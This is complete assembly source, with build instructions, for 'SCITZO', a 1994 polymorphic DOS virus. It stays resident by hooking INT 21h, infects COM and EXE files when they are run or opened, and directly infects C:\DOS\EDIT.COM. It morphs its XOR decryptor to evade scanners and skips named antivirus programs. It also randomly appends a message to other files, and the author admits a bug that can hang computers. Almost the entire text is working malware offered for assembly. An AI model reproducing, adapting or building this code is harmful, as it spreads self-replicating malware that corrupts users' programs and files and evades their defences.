;===============================================================================
;
;              .S.C.I.T.Z.O. .V.i.R.U.S.
;
;                    (c) Red A 1994
;
; This is a polymorphic virus, which infects COM & EXE-files.
; This version has a directinfection of C:\DOS\EDIT.COM,
; an older (and buggy) version has directinfection of
; C:\DOS\KEYB.COM. It's decrypted with a normal XOR-decryption,
; and the loader is morphed into 5 parts, each with 3 alternatives.
; It hooks INT21h and infects both on 4B00h and 3Dxxh. Every time
; a file whithout the ext COM or EXE is opened, there is 1% risc
; that the virus will add '(return) I feel a little scitzo... (return)'
; at the end of the file. The 'Return' is a normal 13,10.
;
; The EXE-infection has a small bug, which in some cases makes infected
; files hang the computer. Any talk about fucked HD's is *bullshit*.
;
; To turn this source into a virus, assemble and link it with
; TASM 3.0+ and put it together with an 8 bytes DUMMIE-file...
; (that is copy /b dummie.com+scitzo.com ready.com - tu)
;
; I also have an new version of this virus, with stealth function
; and a more advanced loadermorphing, but I don't think I'm going
; to spread it. Now I know that I'm able to create polymorphic
; virus, and I've no interest in causing people trouble.
;

; Well, that's all from me. Hope you'll find this source interesting.

;                                                         / Red A 1994

;===============================================================================


cseg    segment byte public 'code'
        assume cs:cseg, ds:cseg

.386

org     100h

virsize equ virend-virstart

virstart:
;               ===============================
tbavfuck:       mov     cx,0ffffh
xxx:            mov     si,621h
                loop    xxx
                nop
;               ===============================
cdds:           mov     ax,cs
                mov     ds,ax
;               ===============================
cryptadder:     mov     si,offset cryptstart+5          ; Cryptstart in si
                mov     al,0
;               ===============================
len:            mov     ax,(virend-cryptstart)/2+1
                mov     cx,ax
                mov     ax,cx
                mov     cx,ax
;               ===============================
decloop:
                db      081h,034h    ; xor word ptr [si],    NOT MODIFIED :(
decval1:        db      000h,000h    ; 0000h
;               ===============================
loopen:         sub     si,0FFFEh                       ; add si,2
                loop    decloop                         ; loop decloop
;               ===============================
                jmp     cryptstart
;-------------------------------------------------------------------------------
;               Decryptor & viruswriter
;-------------------------------------------------------------------------------
decrypt:        call    crypter
                mov     ah,40h
                mov     cx,virend-cryptstart
                mov     dx,offset cryptstart-0100h
                pushf
                db      09Ah                    ; call
Oldint21_II:    dd      0                       ; xxxx:xxxx
                call    crypter
                ret
crypter:
                mov     si,offset cryptstart-0100h
                mov     cx,(virend-cryptstart)/2+1
decloop2:
                db      081h,034h    ; xor word ptr [si],
decval2:        db      000h,000h    ; 0000h
                inc     si
                inc     si
                loop    decloop2
                ret
                nop

                db      ' So, you''ve found this text? '

;-------------------------------------------------------------------------------
;               Here starts the maindecrypted code
;-------------------------------------------------------------------------------
cryptstart:
                call    GetIP
GetIP:          pop     si
                sub     si,offset GetIP-virstart

                push    cs
                pop     ds
                mov     ax,0ABCDh                       ; Check if the virus
                int     21h                             ; is already resident
                cmp     ax,'AH'
                je      exit                            ; if so, exit and
                                                        ; run program
                mov     ah,4ah                          ; Get #of free paras
                mov     bx,0ffffh                       ; in bx
                int     21h                             ;

                sub     bx,(virsize+15)/16+1            ; change..
                mov     ah,4ah
                int     21h

                mov     ah,48h                          ; ..allocation.
                mov     bx,(virsize+15)/16
                int     21h
                jc      exit

                dec     ax                              ; ax-1 = MCB
                mov     es,ax
                mov     word ptr es:[1],8               ; Mark DOS as owner
                inc     ax
                mov     es,ax

                xor     di,di
                mov     cx, virsize
                rep     movsb                           ; Copy virii to mem

                push    es
                pop     ds
                mov     ax,3521h                        ; Hook old INT21h
                int     21h
                mov     word ptr ds:[OldInt21-virstart],bx
                mov     word ptr ds:[OldInt21-virstart+2],es
                mov     dx, offset NewInt21-virstart    ; Set new INT21h
                mov     ax,2521h
                int     21h
;-------------------------------------------------------------------------------
;               Directinfection of C:\DOS\KEYB.COM
;-------------------------------------------------------------------------------

                push    cs
                pop     ds
                call    GetIP3                  ; fix offsset to the string
                db      'C:\DOS\EDIT.COM',0
GetIP3:         pop     dx                      ; offset in dx
                mov     ax,3d02h                ; open file, and infect
                int     21h
                xchg    ax,bx                   ; Fileptr i bx
                mov     ah,3eh                  ; close file...
                int     21h

;-------------------------------------------------------------------------------
;     Exit - restore the 3 startbytes if COM, jumps to org CS:IP if EXE
;-------------------------------------------------------------------------------
exit:
                push    cs
                push    cs
                pop     ds
                pop     es
                call    GetIP2
old3bytes:      db      0B8h,000h,04Ch             ; Will be MOV AX,4C00h
jmpstr:         db      0e9h,002h,000h
execom          db      0h
exejmp:         db      0EAh                       ; jmp far
exejmpstr:      dw      0                          ; 0000:0000
GetIP2:
                pop     si                         ; Get the pos of old3bytes
                cmp     byte ptr [si+6],0          ; COM or EXE infection?
                jne     runexe
                mov     di,0100h                   ; Startpos
                movsw                              ; Writes the three
                movsb                              ; bytes to pos
                mov     ax,0100h
                jmp     ax
runexe:
                mov     ax,cs
old_cs:         add     ax,1234h
                mov     word ptr [si+10],ax

                push    ss
                pop     ax
                sub     ax,10h
                mov     es,ax
                mov     ds,ax

                push    ss
                pop     ax

old_ss:         add     ax,1234h
old_sp:         mov     bx,1234h
                cli
                mov     ss,ax
                mov     sp,bx
                sti

                xor     ax,ax
                xor     bx,bx
                xor     cx,cx
                xor     dx,dx
                xor     si,si
                xor     di,di

                jmp     exejmp

;-------------------------------------------------------------------------------
;               New INT21h interrupt handler
;-------------------------------------------------------------------------------

NewInt21:
                cmp     ax,0ABCDh                       ; Is the virus calling?
                jne     cont                            ; Nope, continue.
                mov     ax,'AH'                         ; Tell the virus that
                iret                                    ; it's already in mem.
cont:
                cmp     ax,4b00h                        ; File executed?
                je      jmpfilerun
                cmp     ah,3dh
                je      fileopen
                jmp     doint21

jmpfilerun:     call    filerun

doint21:
                db      0eah
Oldint21:       dd      0

;-------------------------------------------------------------------------------
;               File open with 3Dxxh
;-------------------------------------------------------------------------------
fileopen:
                push    di
                push    es
                push    cx
                push    ax
                push    ds
                pop     es

                mov     cx,64
                mov     di,dx
                mov     al,'.'
                repne   scasb

                pop     ax
                pop     cx

                cmp     word ptr ds:[di],'OC'
                jne     break1
                cmp     byte ptr ds:[di+2],'M'
                jne     break1
                jmp     gofilerun
break1:
                cmp     word ptr ds:[di],'XE'
                jne     break2
                cmp     byte ptr ds:[di+2],'E'
                jne     break2

gofilerun:      pop     es
                pop     di
                call    filerun
                jmp     doint21
break2:
                pop     es
                pop     di
                call    addtext
                jmp     doint21

;-------------------------------------------------------------------------------
;               File executed with 4B00h
;-------------------------------------------------------------------------------
filerun:
                push    ax
                push    bx
                push    cx
                push    dx
                push    ds
                push    es

                push    cs
                pop     es
                cld

                mov     di,offset signat-100h
                mov     cx,12
checkl:         mov     si,dx
                lodsw
                scasw
                je      hmm
                inc     di
                loop    checkl
                jmp     nopes
hmm:
                lodsb
                scasb
                je      closefile
nopes:
                mov     ax,3D02h                ; Open the file..
                pushf
                push    cs
                call    doint21                 ; Fake INT21 with flags & cs
                jnb     go_on                   ; Ok..
                jmp     closefile               ; error, dont go on.
go_on:
                mov     bx,ax                   ; File handle in bx

                push    cs
                pop     ds                      ; The actual segment

                mov     ax,5700h                ; Get date/time in dx-cx
                int     21h
                mov     word ptr ds:[date-100h],dx
                mov     word ptr ds:[time-100h],cx
                and     cl,1fh
                cmp     cl,3
                je      closefile

                mov     ah,3Fh                  ; Read
                mov     dx,offset old3bytes-0100h
                mov     cx,3
                int     21h                     ; Read three first bytes
                cmp     word ptr ds:[old3bytes-0100h],'ZM'          ; .EXE?
                je      infectexe
                cmp     word ptr ds:[old3bytes-0100h],'MZ'          ; .EXE?
                je      infectexe
                cmp     word ptr ds:[old3bytes-0100h],80E9h         ; Debug?
                je      gerror
                jmp     infectcom
gerror:         jmp     closefile

;-------------------------------------------------------------------------------
;               Infect EXE-file
;-------------------------------------------------------------------------------
infectexe:
                mov     si,offset execom-100h   ; Mark that virus is
                mov     byte ptr [si],1         ; infected on EXE

                mov     ax,4200h
                xor     cx,cx
                xor     dx,dx                   ; move ptr to SOF
                int     21h

                mov     ah,3Fh                  ; Read
                mov     dx,offset exeheader-100h
                mov     cx,18h
                int     21h                     ; Read header

                mov     ax,4202h
                xor     cx,cx
                xor     dx,dx                   ; move ptr to EOF
                int     21h

                mov     word ptr ds:[eof-100h],ax

                cmp     ax,0FFFFh-virsize       ; Can the virus fit?
                ja      closefile
                or      dx,dx                   ; File bigger than 1 seg?
                jnz     closefile

                mov     dx, word ptr ds:[exeheader-100h+08h]   ; Hsize/16
                mov     cl,4
                shl     dx,cl                             ; *16
                sub     ax,dx
                mov     word ptr ds:[save-100h],ax

                mov     dx,ax
                add     dx,offset cryptstart-100h
                mov     word ptr ds:[cryptadder+1-0100h],dx    ; Fix cryptstart

                mov     ax,word ptr ds:[exeheader-100h+14h]    ; the program's
                mov     word ptr ds:[exejmpstr-100h],ax        ; start

                mov     ax,word ptr ds:[exeheader-100h+16h]    ; CS
                mov     word ptr ds:[old_cs-100h+1],ax         ;

                mov     ax,word ptr ds:[exeheader-100h+0eh]    ; SS
                mov     word ptr ds:[old_ss-100h+1],ax

                mov     ax,word ptr ds:[exeheader-100h+10h]    ; SP
                mov     word ptr ds:[old_sp-100h+1],ax

                call    morphloader
                call    writevirus

                mov     ax,word ptr ds:[eof-100h]
                xor     dx,dx
                add     ax,virsize                        ; New EOF
                mov     cx,200h                           ; 512..
                div     cx                                ; EOF/512
                inc     ax                                ; inc slack..
                mov     word ptr ds:[exeheader-100h+2],dx      ; Slack of size/512
                mov     word ptr ds:[exeheader-100h+4],ax      ; Size/512
                mov     word ptr ds:[exeheader-100h+0eh],0     ; Stack size/16
                mov     word ptr ds:[exeheader-100h+10h],0ffffh; SP
                mov     word ptr ds:[exeheader-100h+16h],0     ; CS in module

                mov     ax,word ptr ds:[save-100h]
                mov     word ptr ds:[exeheader-100h+14h],ax    ; IP in module

                mov     ax,4200h
                xor     cx,cx
                xor     dx,dx                   ; move ptr to SOF
                int     21h

                mov     ah,40h                  ; Write
                mov     dx,offset exeheader-100h
                mov     cx,18h
                int     21h                     ; Write header
                jmp     closefile

save            dw      0
eof             dw      0
time            dw      0
date            dw      0

banner:         db      13,10,'I feel a little scitzo...',13,10
bannerend:
;-------------------------------------------------------------------------------
;               Infect COM-file
;-------------------------------------------------------------------------------
infectcom:
                mov     si,offset execom-100h   ; Mark thar virus is
                mov     byte ptr [si],0         ; infected on COM

                mov     ax,4202h
                xor     cx,cx
                xor     dx,dx                   ; move ptr to EOF,
                int     21h                     ; pos in AX

                mov     dx,ax                   ; Virustes startpos+3 i dx
                add     dx,offset cryptstart
                mov     word ptr ds:[cryptadder+1-0100h],dx    ; Fix cryptstart
                sub     ax,3
                mov     word ptr ds:[jmpstr-0100h+1],ax        ; Fix jmp

                call    morphloader
                call    writevirus

                mov     ax,4200h
                xor     cx,cx
                xor     dx,dx                   ; move ptr to SOF,
                int     21h

                mov     ah,40h
                mov     cx,3
                mov     dx,offset jmpstr-0100h
                int     21h                     ; Write jmpstr
                jmp     closefile

;-------------------------------------------------------------------------------
;               Adds the text to files...
;-------------------------------------------------------------------------------
addtext:
                push    ax
                push    bx
                push    cx
                push    dx
                push    ds
                push    es

                mov     ax,03d02h
                pushf
                push    cs
                call    doint21                 ; fake INT 21h
                jc      closefile

                xchg    ax,bx

                mov     ax,5700h                ; Get date/time in dx-cx
                int     21h
                mov     word ptr ds:[date-100h],dx
                mov     word ptr ds:[time-100h],cx
                and     cl,1fh
                cmp     cl,3
                je      closefile

                mov     ah,2ch                   ; Fix random
                int     21h
                cmp     dl,0
                jne     closefile

                mov     ax,4202h
                xor     cx,cx
                xor     dx,dx                   ; move ptr to EOF,
                int     21h

                push    cs
                pop     ds

                mov     ah,40h                  ; Write to file
                mov     dx,offset banner-0100h
                mov     cx,bannerend-banner     ; Length of banner
                int     21h

;-------------------------------------------------------------------------------
;               Closefile
;-------------------------------------------------------------------------------
closefile:
                push    cs
                pop     ds
                mov     ax,5701h                ; Restore date...
                mov     cx,word ptr ds:[time-100h]
                mov     dx,word ptr ds:[date-100h]
                and     cl,11100000b
                or      cl,00000011b            ; ...and mark infected
                int     21h

                mov     ah,3Eh                  ; Close file..
                int     21h
                pop     es
                pop     ds
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                retn

                db      ' SCITZO - by "RED A", Lund, Sweden 1994 '

;-------------------------------------------------------------------------------
;               Alternative for the 'loader'
;-------------------------------------------------------------------------------

varlad1:        db      0B8h,08Bh,0F0h          ; mov ax, .. ; mov si,ax
                db      0BBh,087h,0F3h          ; mov bx, .. ; xchg bx,si
                db      0BEh,0B0h,000h          ; mov si, .. ; mov al,0
;-------------------------------------------------------------------------------
varlad2:        mov     ax,(virend-cryptstart)/2+1
                mov     cx,ax
                mov     ax,cx
                mov     cx,ax
;               ---
                mov     bx,(virend-cryptstart)/2+1+01234h
                sub     bx,01234h
                xchg    cx,bx
;               ---
                mov     di,(virend-cryptstart)/2+1-05678h
                add     di,5678h
                mov     cx,di
;-------------------------------------------------------------------------------
varlad3:
                db      046h,046h,0E2h,0F8h,04Bh,043h
                db      083h,0c6h,002h,0e2h,0f7h,047h
                db      081h,0eeh,0feh,0ffh,0e2h,0f6h
;-------------------------------------------------------------------------------
varlad4:        mov     cx,0ffffh
x:              mov     si,621h
                loop    x
                nop
;               ---
                add     cx,8077h
xx:             mov     si,2133h
                loopnz  xx
;               ---
                sub     cx,0ABCDh
xxxx:           mov     di,2333h
                loop    xxxx
;-------------------------------------------------------------------------------
varlad5:        mov     ax,cs
                mov     ds,ax
;               ---
                mov     dx,cs
                mov     ds,dx
;               ---
                mov     ah,39
                push    cs
                pop     ds
;-------------------------------------------------------------------------------
;               Routin to encrypt/decrypt the encryptor
;-------------------------------------------------------------------------------
cryptcrypt:
                mov     si,offset decrypt-0100h
                mov     cx,(cryptstart-decrypt)/2
decloop3:
                db      081h,034h    ; xor word ptr [si],
decval3:        db      000h,000h    ; 0000h
                inc     si
                inc     si
                loop    decloop3
                ret

;-------------------------------------------------------------------------------
; Encrypt the main body of the virus, via the encryptor and write loader+krypt
;-------------------------------------------------------------------------------
writevirus:
                call    cryptcrypt              ; decipher the decryptor

                mov     ah,2ch                  ; get random value
                int     21h
                mov     word ptr ds:[decval1-100h],dx
                mov     word ptr ds:[decval2-100h],dx
                mov     word ptr ds:[decval3-100h],dx

                call    cryptcrypt              ; encrypt the encryptor
                                                ; with a new value
                mov     ah,40h
                mov     cx,cryptstart-virstart
                xor     dx,dx                   ; write loader+krypterare
                int     21h                     ; loadern
                call    cryptcrypt              ; decipher the decryptor for
                call    kryptnwrite             ; for using & use
                ret

;-------------------------------------------------------------------------------
;            Encrypt the mainpart of the virus, via the encryptor
;-------------------------------------------------------------------------------
kryptnwrite:
                mov     ax,word ptr ds:[OldInt21-0100h]       ; Fix addr
                mov     word ptr ds:[OldInt21_ii-0100h],ax    ; to
                mov     ax,word ptr ds:[OldInt21-0100h+2]     ; INT21
                mov     word ptr ds:[OldInt21_ii-0100h+2],ax  ; call

                call    decrypt                 ; Encrypt virus+write virus
                call    cryptcrypt              ; Encrypt the encryptor
                ret

;-------------------------------------------------------------------------------
;               Routine for encrypt/decrypt the decryptor
;-------------------------------------------------------------------------------
morphloader:
                mov     ah,2ch                   ; Fix random
                int     21h

                push    ds
                pop     es

                mov     ax,dx                    ;Move randomvalue to ax
                and     ax,3                     ;get random 0-3
                cmp     al,3                     ;check 3, if so decrease
                jne     nosub                    ;to 2. random = 0-2
                dec     al
nosub:          mov     cl,3                     ; multiply random with 3
                mul     cl
                mov     si,offset varlad1-0100h
                add     si,ax                    ; Get pos in varlad1
                mov     di,offset cryptadder-100h
                movsb
                inc     di
                inc     di
                movsw

                mov     ax,dx                     ;Random value to ax again
                shr     ax,2                      ;2 new bits
                and     ax,3                      ;random 0-3
                cmp     al,3                      ;3? == decrease to
                jne     nosub2                    ;till 2. random = 2
                dec     al
nosub2:         mov     cl,9                     ; multiply random with 9
                mul     cl
                mov     si,offset varlad2-0100h
                add     si,ax                    ; Get pos i varlad2
                mov     di,offset len-100h
                movsw
                movsw
                movsw
                movsw
                movsb

                mov     ax,dx                     ;Random to ax (again!)
                shr     ax,4                      ;2 new bits
                and     ax,3                      ;random 0-3
                cmp     al,3                      ;3? - decrease to
                jne     nosub3                    ;2. random 0-2.
                dec     al
nosub3:         mov     cl,6                      ;Multiply random with 6
                mul     cl
                mov     si,offset varlad3-0100h
                add     si,ax                      ;Get pos in varlad2
                mov     di,offset loopen-100h
                movsw
                movsw
                movsw

                mov     ah,2ch                     ; Get new random
                int     21h

                mov     ax,dx                     ;Random value to ax
                shr     ax,3                      ;2 new bits
                and     ax,3                      ;get random from 0-3
                cmp     al,3                      ;3?, if so, decrease to
                jne     nosub4                    ;2. random 0-2
                dec     al
nosub4:         mov     cl,9                      ;mul random with 9
                mul     cl
                mov     si,offset varlad4-0100h
                add     si,ax                     ;get pos in varlad2
                mov     di,offset tbavfuck-100h
                movsw
                movsw
                movsw
                movsw
                movsb

                mov     ax,dx                     ;random to till ax (again)
                shr     ax,1                      ;2 new bits
                and     ax,3                      ;random = 0-3
                cmp     al,3                      ;3?, descrease with one to
                jne     nosub5                    ;2. random = 0-2
                dec     al
nosub5:         mov     cl,4                      ;multiply random with 4
                mul     cl
                mov     si,offset varlad5-0100h
                add     si,ax                    ; Get pos in varlad5
                mov     di,offset tbavfuck-0100h
                movsw
                movsw
                ret
;-------------------------------------------------------------------------------
signat:

; Check for files that shouldnt be infected..
; This wasn't included in the public first release ( - tu)

                db      'TBA'                   ; Tbav
                db      'TBS'                   ; Tbscan
                db      'F-P'                   ; F-Prot
                db      'VSH'			; Vshield
                db      'MSA'                   ; Msav
                db      'TBC'                   ; Tbclean
                db      'CPA'			; Cpav
                db      'VSA'			; Vsafe
                db      'VIR'			; Viruscan (etc..)
                db      'SCA'			; Scan
                db      'CLE'			; Clean
                db      'TOO'			; S&S Toolkit

exeheader       db      18h dup (0)             ;

virend:

cseg ends
end     virstart


; Well, that's all folks.

